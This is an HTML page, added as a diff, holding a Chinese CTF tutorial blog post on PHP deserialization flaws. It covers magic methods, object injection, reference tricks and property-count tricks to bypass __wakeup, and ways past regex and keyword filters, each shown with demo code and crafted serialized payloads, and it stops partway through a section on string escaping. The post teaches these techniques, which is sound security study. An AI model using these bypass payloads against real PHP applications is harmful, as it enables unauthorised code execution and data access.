@@ -1,0 +1,1374 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>php反序列化总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">php反序列化总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">2022-12-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
+<p>在反序列化的过程中自动触发了某些魔术方法。</p>
+<p><strong>漏洞触发条件</strong>：unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法</p>
+<p><strong>序列化demo</strong></p>
+<pre><code class="php">&lt;?php
+class sakura&#123;
+    public $a=&#39;HY&#39;;
+    public $b=&#39;666&#39;;
+
+    public function __wakeup()&#123;
+        print $this-&gt;a+$this-&gt;b;
+    &#125;
+&#125;
+$a = new sakura();
+print (serialize($a));
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209165156822.png" alt="image-20221209165156822"></p>
+<p><strong>序列化数据格式</strong></p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209162056383.png" alt="image-20221209162056383"></p>
+<h1 id="常用魔术方法总结"><a href="#常用魔术方法总结" class="headerlink" title="常用魔术方法总结"></a>常用魔术方法总结</h1><p>一、__construct(构造方法)</p>
+<pre><code class="php">当类被实例化的时候就会调用
+简单来说，就是new一个类的时候，这个方法就会自动执行
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __construct()
+    &#123;
+        echo &#39;我是类autofelix&#39;;
+    &#125;
+&#125;
+ 
+new autofelix();
+ 
+//即可输出:我是类autofelix
+123456789101112131415
+</code></pre>
+<p>二、 __destruct(析构方法)</p>
+<pre><code class="php">当类被销毁时候自动触发
+可以使用unset方法触发该方法
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __destruct()
+    &#123;
+        echo &#39;我准备销毁你了&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+unset($a);
+ 
+//即可输出:我准备销毁你了
+12345678910111213141516
+</code></pre>
+<p>三、 __clone(克隆方法)</p>
+<pre><code class="php">当类被克隆时自动会自动调用
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __clone()
+    &#123;
+        echo &#39;我克隆了你&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+clone $a;
+ 
+//即可输出:我克隆了你
+123456789101112131415
+</code></pre>
+<p>四、__call(非静态调用方法)</p>
+<pre><code class="php">当要调用的方法不存在或者权限不足时候会自动调用
+比如我在类的外部调用类内部的private修饰的方法
+
+&lt;?php
+class autofelix 
+&#123;
+    private function say() 
+    &#123;
+        echo &#39;hello, 我是autofelix&#39;;
+    &#125;
+ 
+    public function __call($name, $arguments)
+    &#123;
+        echo &#39;你无权调用&#39; . $name . &#39;方法&#39;;
+        die;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+$a-&gt;say(); //按理说应该报错
+ 
+//即可输出:你无权调用say方法
+12345678910111213141516171819202122
+</code></pre>
+<p>五、__callStatic(静态调用方法)</p>
+<pre><code class="php">当要调用的静态方法不存在或者权限不足时候会自动调用
+比如我在类的外部调用类内部的private修饰的静态方法
+
+&lt;?php
+class autofelix 
+&#123;
+    private static function say() 
+    &#123;
+        echo &#39;hello, 我是autofelix&#39;;
+    &#125;
+ 
+    public function __callStatic($name, $arguments)
+    &#123;
+        echo &#39;你无权调用&#39; . $name . &#39;方法&#39;;
+        die;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+$a::say(); //按理说应该报错
+ 
+//即可输出:你无权调用say方法
+12345678910111213141516171819202122
+</code></pre>
+<p>六、__debugInfo(打印方法)</p>
+<pre><code class="php">该方法会在var_dump()类对象时候被调用
+如果没有定义该方法，var_dump()将会打印出所有的类属性
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __debugInfo()
+    &#123;
+        echo &#39;你看不到我任何信息的~&#39;;
+    &#125;
+&#125;
+ 
+var_dump(new autofelix());
+ 
+//即可输出:你看不到我任何信息的~
+123456789101112131415
+</code></pre>
+<p>七、__get(获取成员属性方法)</p>
+<pre><code class="php">通过它可以在对象外部获取私有成员属性
+
+&lt;?php
+class autofelix 
+&#123;
+    private $name = &#39;autofelix&#39;;
+ 
+    public function __get($name)
+    &#123;
+        if(in_array($name, [&#39;name&#39;, &#39;age&#39;])) &#123;
+           echo $this-&gt;name;
+        &#125; else &#123;
+            echo &#39;不是什么东西都能访问的~&#39;;
+        &#125;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+$a-&gt;name;
+ 
+//即可输出:autofelix
+123456789101112131415161718192021
+</code></pre>
+<p>八、__isset方法</p>
+<pre><code class="php">当对不可访问的属性调用isset()或则会empty()时候会被自动调用
+
+&lt;?php
+class autofelix 
+&#123;
+    private $name = &#39;autofelix&#39;;
+ 
+    public function __isset($name)
+    &#123;
+        if(in_array($name, [&#39;name&#39;, &#39;age&#39;])) &#123;
+           echo $this-&gt;name;
+        &#125; else &#123;
+            echo &#39;不是什么东西都能访问的~&#39;;
+        &#125;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+isset($a-&gt;name);
+ 
+//结果: autofelix
+123456789101112131415161718192021
+</code></pre>
+<p>九、__set方法</p>
+<pre><code class="php">给一个未定义的属性赋值时候会被触发
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __set($name, $value)
+    &#123;
+        echo &#39;你想给&#39; . $name . &#39;赋值&#39; . $value;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+$a-&gt;name = &#39;autofelix&#39;;
+ 
+//结果: 你想给name赋值autofelix;
+123456789101112131415
+</code></pre>
+<p>十、__invoke方法</p>
+<pre><code class="php">对象本身不能直接当函数用
+如果对象被当作函数调用就会触发该方法
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __invoke()
+    &#123;
+        echo &#39;你还想调用我?&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+ 
+//对象直接当函数调用
+$a();
+ 
+//结果: 你还想调用我?
+123456789101112131415161718
+</code></pre>
+<p>十一、__sleep方法</p>
+<pre><code class="php">当在类的外部调用serialize()时会自动被调用
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __sleep()
+    &#123;
+        echo &#39;弄啥嘞~&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+ 
+serialize($a);
+ 
+//结果: 弄啥嘞~
+12345678910111213141516
+</code></pre>
+<p>十二、__toString方法</p>
+<pre><code class="php">当一个类被当作字符串处理时应该返回什么
+这里必须返回一个string类型不然会报致命错误
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __toString()
+    &#123;
+        return &#39;我是你得不到的对象...&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+echo $a;
+ 
+//结果: 我是你得不到的对象...
+12345678910111213141516
+</code></pre>
+<p>十三、__unset方法</p>
+<pre><code class="php">当对不可访问的属性调用unset()时会被自动调用
+
+&lt;?php
+class autofelix 
+&#123;
+    private $name = &#39;autofelix&#39;;
+ 
+    public function __unset($name)
+    &#123;
+        echo &#39;想删我? 你也配?&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+unset($a-&gt;name);
+ 
+//结果: 想删我? 你也配?
+1234567891011121314151617
+</code></pre>
+<p>十四、__wakeup方法</p>
+<pre><code class="php">当执行unserialize()方法时会被自动调用
+
+&lt;?php
+class autofelix 
+&#123;
+    public function __wakeup()
+    &#123;
+        echo &#39;又想弄啥嘞~&#39;;
+    &#125;
+&#125;
+ 
+$a = new autofelix();
+ 
+unserialize($a);
+ 
+//结果: 又想弄啥嘞~
+12345678910111213141516
+</code></pre>
+<h1 id="魔术方法的执行顺序"><a href="#魔术方法的执行顺序" class="headerlink" title="魔术方法的执行顺序"></a>魔术方法的执行顺序</h1><p>不同的魔术方法的执行顺序是不一样的，我们只需要搞清楚最开始会先执行什么，最后会执行什么就可以了</p>
+<p>我们就来探讨下 <code>__construt</code>,<code>__wakeup</code>,<code>__destruct</code>这几个魔术方法的执行顺序</p>
+<p><strong>首先我们来看一下new一个类的时候魔术方法的执行顺序</strong></p>
+<pre><code class="php">&lt;?php
+class sakura&#123;
+    public $a=&#39;HY&#39;;
+    public $b=&#39;666&#39;;
+
+    public function __construct()&#123;
+        print &quot;这是__construct方法\r\n&quot;;
+    &#125;
+
+    public function __wakeup()&#123;
+        print &quot;这是__wakeup方法\r\n&quot;;
+    &#125;
+
+    public function __destruct()&#123;
+        print &quot;这是__destruct方法\r\n&quot;;
+    &#125;
+&#125;
+$a = new sakura();
+print (serialize($a).&quot;\r\n&quot;);
+</code></pre>
+<p>运行一下</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209170709748.png" alt="image-20221209170709748"></p>
+<p>​    这是我们序列化的过程</p>
+<p>由于我们new了一个sakura类，所以会调用<code>__construct</code>方法,然后就会执行我们的print语句输出了序列化的值，最后new完以后这个类会被销毁所以会调用<code>__destruct方法</code></p>
+<p><strong>同理，我们来看一下反序列化过程,demo如下</strong></p>
+<pre><code class="php">&lt;?php
+class sakura&#123;
+    public $a=&#39;HY&#39;;
+    public $b=&#39;666&#39;;
+
+    public function __construct()&#123;
+        print &quot;这是__construct方法\r\n&quot;;
+    &#125;
+
+    public function __wakeup()&#123;
+        print &quot;这是__wakeup方法\r\n&quot;;
+    &#125;
+
+    public function __destruct()&#123;
+        print &quot;这是__destruct方法\r\n&quot;;
+    &#125;
+&#125;
+#$a = new sakura();
+#print (serialize($a).&quot;\r\n&quot;);
+$b = &#39;O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#39;;
+unserialize($b);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209171216201.png" alt="image-20221209171216201"></p>
+<p>这里由于我们没有new一个对象的操作，所以就没有执行<code>__construct</code>方法</p>
+<p>首先进行反序列化，<code>__wakeup</code>是当执行unserialize()方法时会被自动调用,所以是最先开始调用的</p>
+<p>最后会对类进行销毁，所以会调用<code>__destruct方法</code></p>
+<p>其他魔术方法的调用都必须在它们两个之间!</p>
+<p>到这里基础知识就已经够了，接下来我们就来看一些反序列化在ctf中的常见考法</p>
+<h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p>
+<p><strong>对象漏洞</strong>出现得满足两个前提</p>
+<blockquote>
+<p>1、<code>unserialize</code>的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+class A&#123;
+    var $test = &quot;ssss&quot;;
+    function __destruct()&#123;
+        echo $this-&gt;test;
+    &#125;
+&#125;
+$a = &#39;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;HY&quot;;&#125;&#39;;
+unserialize($a);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210172357978.png" alt="image-20221210172357978"></p>
+<h1 id="指针引用"><a href="#指针引用" class="headerlink" title="指针引用"></a>指针引用</h1><p>在php反序列化中,r、R 分别表示对象引用和指针引用，在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。</p>
+<p>在解释对象引用和指针引用之前，先让我们看几个例子</p>
+<pre><code class="php">&lt;?php
+class SampleClass &#123;
+    var $value;
+&#125;
+
+$a = new SampleClass();
+$a-&gt;value = $a;
+
+$b = new SampleClass();
+$b-&gt;value = &amp;$b;
+
+echo serialize($a);
+echo &quot;\n&quot;;
+echo serialize($b);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209203846002.png" alt="image-20221209203846002"></p>
+<p>我们发现,这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1</p>
+<p>但是对象引用和指针引用到底有什么区别呢？让我们看下面这个例子</p>
+<pre><code class="php">&lt;?php
+class SampleClass &#123;
+    var $value;
+&#125;
+
+$a = new SampleClass();
+$a-&gt;value = $a;
+$b = new SampleClass();
+$b-&gt;value = &amp;$b;
+
+$a-&gt;value = 1;
+$b-&gt;value = 1;
+
+var_dump($a);
+var_dump($b);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209204547992.png" alt="image-20221209204547992"></p>
+<p>这表示，当我们改变<code>$a-&gt;value</code>的值时，仅仅改变了<code>$a-&gt;value</code>的值,但是当我们改变<code>$b-&gt;value</code>的值时，却改变了$b的本身</p>
+<p>有时候这个考点会出现在ctf中，现在我们来讲解一个ctf题目</p>
+<p><strong>ctf题目讲解</strong></p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+class File &#123;
+    public $filename;
+    public $secret;
+    public function __construct($filename, $secret)&#123;
+            echo &quot;construct被调用&quot;;
+            echo $filename;
+            echo $secret;
+            $this -&gt; filename= $filename ;
+            $this-&gt;secret=$secret;
+&#125;
+public function __wakeup()&#123;
+            $this-&gt;filename=&quot;nonoflag&quot; ;
+            if(isset($_GET[&#39;secret&#39;]))&#123;
+            $this-&gt;secret= $_GET[&#39;secret&#39;]; 
+&#125;
+&#125;
+public function __destruct()&#123;
+            echo &quot;destruct被调用&quot;;
+            printf($this-&gt;filename);
+            echo &quot;\n&quot;;
+&#125;
+&#125;
+
+$flag = $_GET[&#39;x&#39;];
+unserialize($flag);
+</code></pre>
+<p>这题稍微改编了下，我们的目的就是让<code>$this-&gt;filename</code>最终等于<code>flag.php</code>,而这题的前提条件又是php的版本较高，无法使用fast destruct的情况</p>
+<p>我们先假装不知道不能用fast destruct</p>
+<p>首先正常构造一个反序列化</p>
+<pre><code class="php">&lt;?php
+class File &#123;
+    public $filename;
+    public $secret;
+&#125;
+$a = new File();
+$a-&gt;filename=&#39;flag.php&#39;;
+print serialize($a);
+//O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;&#125;
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233516920.png" alt="image-20221209233516920"></p>
+<p>如图，由于<code>__wakeup</code>魔术方法的存在<code>$filename</code>从我们传入的<code>flag.php</code>变为了<code>nonoflag</code>,然后尝试使用fast destruct</p>
+<pre><code class="php">O:4:&quot;File&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;&#125;
+O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233659929.png" alt="image-20221209233659929"></p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233712131.png" alt="image-20221209233712131"></p>
+<p>如上图，最终都失败了，所以我们要尝试看有没有其它办法,由于这里并不止<code>filename</code>一个变量,而且<code>__wakeup</code>里有这样一行代码</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209234010104.png" alt="image-20221209234010104"></p>
+<p>是不是觉得很眼熟,由此我们可以尝试引入我们上文讲的指针引用</p>
+<p>构造payload如下:</p>
+<pre><code class="php">&lt;?php
+class File &#123;
+    public $filename;
+    public $secret;
+&#125;
+$a = new File();
+$a-&gt;filename=&#39;HY&#39;;
+$a-&gt;filename=&amp;$a-&gt;secret;
+print serialize($a);
+// O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;
+</code></pre>
+<p>然后反序列化的同时给<code>secret</code>传入<code>flag.php</code></p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210000052881.png" alt="image-20221210000052881"></p>
+<p>神奇的事情发生了，<code>filename</code>的值成功变为<code>flag.php</code>了</p>
+<p>整个流程是这样的:</p>
+<p>我们给<code>filename</code>随意赋值为<code>HY</code>,然后使用一个指针引用。当反序列化的时候，调用<code>__wakeup</code>魔术方法,<code>filename</code>被赋值为了<code>nonoflag</code>,但是它下一步的时候,<code>secret</code>参数就接收了我们传入的<code>flag.php</code>,由于指针引用的关系,<code>filename</code>也跟着<code>secret</code>变为了<code>flag.php</code></p>
+<h1 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h1><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p>
+<ol>
+<li>利用加号绕过（注意在url里传参时+要编码为%2B）</li>
+<li>serialize(array( a ) ) ; / / a));// a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li>
+</ol>
+<pre><code class="php">&lt;?php
+class test&#123;
+    public $a;
+    public function __construct()&#123;
+        $this-&gt;a = &#39;abc&#39;;
+    &#125;
+    public function  __destruct()&#123;
+        echo $this-&gt;a.PHP_EOL;
+    &#125;
+&#125;
+
+function match($data)&#123;
+    if (preg_match(&#39;/^O:\d+/&#39;,$data))&#123;
+        die(&#39;you lose!&#39;);
+    &#125;else&#123;
+        return $data;
+    &#125;
+&#125;
+$a = &#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;;
+// +号绕过
+$b = str_replace(&#39;O:4&#39;,&#39;O:+4&#39;, $a);
+unserialize(match($b));
+// serialize(array($a));
+unserialize(&#39;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#39;);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010008949.png" alt="image-20221210010008949"></p>
+<h1 id="fast-destruct-绕过-wakeup"><a href="#fast-destruct-绕过-wakeup" class="headerlink" title="fast destruct(绕过__wakeup)"></a>fast destruct(绕过__wakeup)</h1><p>今天介绍的这个技巧被称为<code>fast destruct</code>，可以在<code>unserialize</code>函数执行完后，立即触发我们的poc,这样就可以绕过一些限制，如<code>__wakeup</code>魔术方法</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209200143603.png" alt="image-20221209200143603"></p>
+<ul>
+<li>存在漏洞的PHP版本: PHP5.6.25之前版本和7.0.10之前的7.x版本</li>
+<li>漏洞概述: <code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li>
+<li>漏洞原理: <code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code> </li>
+</ul>
+<p>我这里用 phpstudy+php7.0.9来复现这个漏洞</p>
+<p>我们来写一个demo</p>
+<pre><code class="php">&lt;?php
+class sakura&#123;
+    public $a=&#39;HY&#39;;
+    public $b=&#39;666&#39;;
+
+    public function __construct()&#123;
+        print &quot;这是__construct方法\r\n&quot;;
+    &#125;
+
+    public function __wakeup()&#123;
+        print &quot;这是__wakeup方法\r\n&quot;;
+    &#125;
+
+    public function __destruct()&#123;
+        print &quot;这是__destruct方法\r\n&quot;;
+    &#125;
+&#125;
+#$a = new sakura();
+#print (serialize($a).&quot;\r\n&quot;);
+$b = &#39;O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#39;;
+unserialize($b);
+</code></pre>
+<p>正常反序列化过程:</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201038411.png" alt="image-20221209201038411"></p>
+<p><strong>1.修改序列化数字元素个数</strong></p>
+<pre><code class="php">O:6:&quot;sakura&quot;:3:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;  //我这里讲2改为了3
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201155305.png" alt="image-20221209201155305"></p>
+<p>我们发现只执行了<code>__destruct</code>方法，而没有执行<code>__wakeup</code>方法，成功绕过了<code>__wakeup</code>魔术方法的执行</p>
+<p><strong>2.去掉序列化尾部 }</strong></p>
+<pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;
+</code></pre>
+<p>我在windows上复现失败了，不过这种方法是可行的，就不再复现了</p>
+<h1 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h1><p>在序列化的时候:如果变量前是protected，则是\x00*\x00变量名的形式,如果变量前是private,则是\x00类名\x00的形式</p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    protected $a;
+    private $b;
+    public function __construct()&#123;
+        $this-&gt;a = &#39;abc&#39;;
+        $this-&gt;b=  &#39;def&#39;;
+    &#125;
+    public function  __destruct()&#123;
+        echo &quot;\n&quot;;
+        echo $this-&gt;a;
+        echo $this-&gt;b;
+    &#125;
+&#125;
+$a = new test();
+echo serialize($a);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210004733397.png" alt="image-20221210004733397"></p>
+<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    protected $a;
+    public function __construct()&#123;
+        $this-&gt;a = &#39;abc&#39;;
+    &#125;
+    public function  __destruct()&#123;
+        echo $this-&gt;a;
+    &#125;
+&#125;
+unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);
+</code></pre>
+<h1 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h1><pre><code class="php">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;
+可以写成
+O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;
+表示字符类型的s大写时，会被当成16进制解析。
+</code></pre>
+<p>这里写了一个例子:</p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    public $username;
+    public function __construct()&#123;
+        $this-&gt;username = &#39;admin&#39;;
+    &#125;
+    public function  __destruct()&#123;
+        echo 666;
+    &#125;
+&#125;
+function check($data)&#123;
+    if(stristr($data, &#39;username&#39;)!==False)&#123;
+        echo(&quot;你绕不过！！&quot;.PHP_EOL);
+    &#125;
+    else&#123;
+        return $data;
+    &#125;
+&#125;
+// 未作处理前
+$a = &#39;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#39;;
+$a = check($a);
+unserialize($a);
+// 做处理后 \75是u的16进制
+$a = &#39;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#39;;
+$a = check($a);
+unserialize($a);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010741617.png" alt="image-20221210010741617"></p>
+<p>如图，处理后成功的绕过了!</p>
+<h1 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h1><p>一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变。其主要原理就是运用闭合的思想。</p>
+<p>示例代码:</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+class sakura&#123;
+    public $name=&#39;HY&#39;;
+    public $age=&#39;25&#39;;
+&#125;
+$a = new sakura();
+$a = serialize($a);
+print ($a);
+var_dump(unserialize($a));
+</code></pre>
+<p>运行这段代码,我们可以得到这个类正常序列化的值，和它反序列化的内容</p>
+<pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;
+class sakura#1 (2) &#123;
+  public $name =&gt;
+  string(2) &quot;HY&quot;
+  public $age =&gt;
+  string(2) &quot;25&quot;
+&#125;
+</code></pre>
+<p>但是我们可以在反序列化时，对其值做一些手脚,如果我们对这样一个序列化值进行反序列化会发生什么呢?</p>
+<pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;123
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013324096.png" alt="image-20221210013324096"></p>
